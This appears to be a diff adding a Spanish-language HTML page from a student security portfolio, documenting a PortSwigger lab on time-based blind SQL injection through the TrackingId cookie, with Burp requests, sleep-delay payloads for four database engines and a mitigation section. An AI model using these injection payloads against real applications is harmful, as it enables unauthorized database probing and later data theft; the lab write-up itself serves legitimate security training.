@@ -1,0 +1,194 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lab 14</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <header>
+        <h1>Lab 14</h1>
+        <nav>
+            <ul>
+                <li><a href="pd03.html">← Volver al roadmap</a></li>
+                <li><a href="#lab">Laboratorio</a></li>
+                <li><a href="#procedimiento">Procedimiento</a></li>
+                <li><a href="#evidencia">Evidencia</a></li>
+            </ul>
+        </nav>
+    </header>
+
+    <!-- LABORATORIO 14 -->
+    <section id="lab">
+        <h2>Lab14: Blind SQL injection with time delays</h2>
+        
+        <table>
+            <tr>
+                <th>Nivel</th>
+                <td>Practitioner</td>
+            </tr>
+            <tr>
+                <th>Tipo de SQLi</th>
+                <td>Blind SQL injection with time delays</td>
+            </tr>
+        </table>
+
+        <h3>Objetivo</h3>
+        <p>Introducir un comando que genere un retraso (delay) en la página para observar si se puede realizar una inyección de SQL basada en tiempo.</p>
+
+        <h3>Vulnerabilidad</h3>
+        <p>La cookie <strong>TrackingId</strong> es vulnerable a inyección SQL. La aplicación no muestra cambios en el contenido ni errores, pero permite ejecutar consultas que introducen pausas en la base de datos. Al medir el tiempo de respuesta del servidor, el atacante puede inferir si una condición es verdadera o falsa.</p>
+        
+        <p>En este laboratorio, el objetivo no es extraer datos, sino simplemente demostrar que es posible introducir un retraso temporal mediante SQL Injection. Esto confirma la vulnerabilidad y prepara el terreno para ataques de extracción basados en tiempo.</p>
+        
+        <p>Cada motor de base de datos tiene su propia función para generar pausas:</p>
+        <ul>
+            <li><strong>PostgreSQL:</strong> pg_sleep(segundos)</li>
+            <li><strong>MySQL:</strong> SLEEP(segundos)</li>
+            <li><strong>Microsoft SQL Server:</strong> WAITFOR DELAY '0:0:10'</li>
+            <li><strong>Oracle:</strong> DBMS_LOCK.SLEEP(10) o mediante consultas heavy que consuman tiempo</li>
+        </ul>
+    </section>
+
+    <!-- PROCEDIMIENTO -->
+    <section id="procedimiento">
+        <h2>Procedimiento</h2>
+        
+        <ol>
+            <li>
+                <strong>Enviar la petición al Repeater de BurpSuite</strong> y observar la cookie de TrackingId.
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px; margin-top: 10px;">GET / HTTP/1.1
+Cookie: TrackingId=xyz123</pre>
+            </li>
+            <li>
+                <strong>Agregar una comilla al final</strong> para terminar la consulta de la cookie e ingresar el operador de concatenación:
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' ||</pre>
+            </li>
+            <li>
+                <strong>Probar con diferentes funciones de delay</strong> para identificar el motor de base de datos:
+                
+                <p><strong>Prueba con SLEEP (MySQL):</strong></p>
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' || SLEEP(10)--</pre>
+                <p>La respuesta es rápida (menos de 1 segundo), indicando que no es MySQL.</p>
+                
+                <p><strong>Prueba con pg_sleep (PostgreSQL):</strong></p>
+                <pre style="background-color: #1e293b; padding: 10px; border-radius: 8px;">Cookie: TrackingId=xyz' || pg_sleep(10)--</pre>
+                <p>La respuesta tarda aproximadamente 10 segundos, confirmando que la base de datos es PostgreSQL.</p>
+            </li>
+            <li>
+                <strong>Verificar el delay</strong> observando el tiempo de respuesta en Burp Suite:
+                <ul>
+                    <li>Sin inyección: tiempo de respuesta ~100-300 ms.</li>
+                    <li>Con pg_sleep(10): tiempo de respuesta ~10,000-10,300 ms.</li>
+                </ul>
+            </li>
+            <li>
+                <strong>Confirmar la vulnerabilidad</strong> al comprobar que el servidor tarda 10 segundos en responder exclusivamente cuando se inyecta pg_sleep(10).
+            </li>
+        </ol>
+
+        <h3>Payload utilizado</h3>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px; font-size: 1.1rem;">xyz' || (SELECT pg_sleep(10))--</pre>
+        
+        <h4>Explicación del payload</h4>
+        <ul>
+            <li><strong>xyz'</strong>: Cierra la cadena original de la cookie TrackingId.</li>
+            <li><strong>||</strong>: Operador de concatenación en PostgreSQL. Permite agregar el resultado de una subconsulta a la cadena original.</li>
+            <li><strong>(SELECT pg_sleep(10))</strong>: Subconsulta que ejecuta la función pg_sleep(10), causando una pausa de 10 segundos en la base de datos.</li>
+            <li><strong>--</strong>: Comenta el resto de la consulta original para evitar errores de sintaxis.</li>
+        </ul>
+
+        <h4>Variantes según motor de base de datos</h4>
+        <table style="width:100%; margin-top:15px;">
+            <thead>
+                <tr>
+                    <th>Motor</th>
+                    <th>Payload</th>
+                </tr>
+            </thead>
+            <tbody>
+                <tr>
+                    <td>PostgreSQL</td>
+                    <td><code>' || (SELECT pg_sleep(10))--</code></td>
+                </tr>
+                <tr>
+                    <td>MySQL</td>
+                    <td><code>' OR SLEEP(10)--</code></td>
+                </tr>
+                <tr>
+                    <td>Microsoft SQL Server</td>
+                    <td><code>'; WAITFOR DELAY '0:0:10'--</code></td>
+                </tr>
+                <tr>
+                    <td>Oracle</td>
+                    <td><code>' || (SELECT DBMS_LOCK.SLEEP(10) FROM DUAL)--</code></td>
+                </tr>
+            </tbody>
+        </table>
+
+        <h3>Consulta final ejecutada (PostgreSQL)</h3>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">SELECT * FROM tracking WHERE id = 'xyz' || (SELECT pg_sleep(10))--'</pre>
+        <p>La consulta concatena el resultado de pg_sleep(10) (que es NULL) al valor original, pero lo importante es que la función se ejecuta y causa un retraso de 10 segundos antes de que la consulta complete su ejecución.</p>
+    </section>
+
+    <!-- EVIDENCIA TÉCNICA -->
+    <section id="evidencia">
+        
+
+        <h3>Verificación del ataque</h3>
+        <p>La vulnerabilidad se confirma al observar que:</p>
+        <ul>
+            <li>La petición con el payload <code>xyz' || (SELECT pg_sleep(10))--</code> tarda aproximadamente 10 segundos en recibir respuesta.</li>
+            <li>La petición sin inyección o con payloads incorrectos responde inmediatamente.</li>
+            <li>La diferencia en el tiempo de respuesta es consistente y reproducible.</li>
+        </ul>
+        
+        <p>Esto demuestra que es posible ejecutar comandos SQL arbitrarios en el servidor de base de datos, aunque no haya cambios visibles en la página. Esta técnica es la base para ataques de extracción de datos basados en tiempo (time-based blind SQL injection).</p>
+        
+        <div style="background-color: #1e293b; padding: 15px; border-radius: 8px; margin-top: 20px;">
+            <p><strong>Resultado esperado:</strong> El laboratorio se resuelve correctamente al introducir el delay y aparece el mensaje "Congratulations, you solved the lab!" en la interfaz de PortSwigger Academy.</p>
+        </div>
+    </section>
+
+    <!-- MITIGACIÓN RECOMENDADA -->
+    <section>
+        <h2>Mitigación recomendada</h2>
+        
+        <h4>Consultas Preparadas (Parameterized Queries)</h4>
+        <p>Implementar consultas parametrizadas es la defensa principal. Al usar parámetros, los valores inyectados se tratan como datos y no como parte del código SQL, bloqueando cualquier intento de inyección, incluyendo funciones como pg_sleep().</p>
+        <pre style="background-color: #1e293b; padding: 15px; border-radius: 8px;">SELECT * FROM tracking WHERE id = ?</pre>
+        
+        <h4>Validación de Entradas</h4>
+        <p>Validar estrictamente el formato del TrackingId. Si sigue un patrón predecible (alfanumérico de longitud fija), rechazar cualquier valor que no cumpla con ese patrón.</p>
+        
+        <h4>Límite de Tiempo de Ejecución</h4>
+        <p>Configurar límites de tiempo de ejecución para las consultas en la base de datos, de modo que funciones como pg_sleep() no puedan ejecutarse o sean interrumpidas.</p>
+        
+        <h4>Principio de Menor Privilegio</h4>
+        <p>La cuenta de base de datos debe tener permisos mínimos. Idealmente, no debería tener permiso para ejecutar funciones como pg_sleep() que no son necesarias para el funcionamiento normal de la aplicación.</p>
+        
+        <h4>Web Application Firewall (WAF)</h4>
+        <p>Implementar un WAF que detecte y bloquee patrones de inyección SQL, incluyendo intentos de usar funciones de delay.</p>
+        
+        <h4>Eliminar la Capacidad de Ejecutar Funciones Peligrosas</h4>
+        <p>En PostgreSQL, se puede revocar el permiso de ejecución de funciones como pg_sleep() para el usuario de la aplicación.</p>
+    </section>
+
+    <!-- REFERENCIA AL DOCUMENTO ORIGINAL -->
+    <section style="background-color: #0f172a; border: 1px solid #334155;">
+        <p><a href="act08-Equipo1.pdf" class="btn-blog" style="margin-top: 10px; display: inline-block;" download>Descargar PDF completo</a></p>
+    </section>
+
+    <!-- NAVEGACIÓN ENTRE LABORATORIOS -->
+    <section style="display: flex; justify-content: space-between; margin-top: 30px;">
+        <a href="pd03-lab13.html" class="btn-blog">← Laboratorio anterior (Lab 13)</a>
+        <a href="pd03-lab15.html" class="btn-blog">Siguiente laboratorio (Lab 15) →</a>
+    </section>
+
+   <footer>
+        <p>  Slugish – Portafolio de Seguridad Informática</p>
+        <p>GitHub: <a href="https://github.com/sluggishpoem" target="_blank">github.com/sluggishpoem</a></p>
+    </footer>
+</body>
+</html>
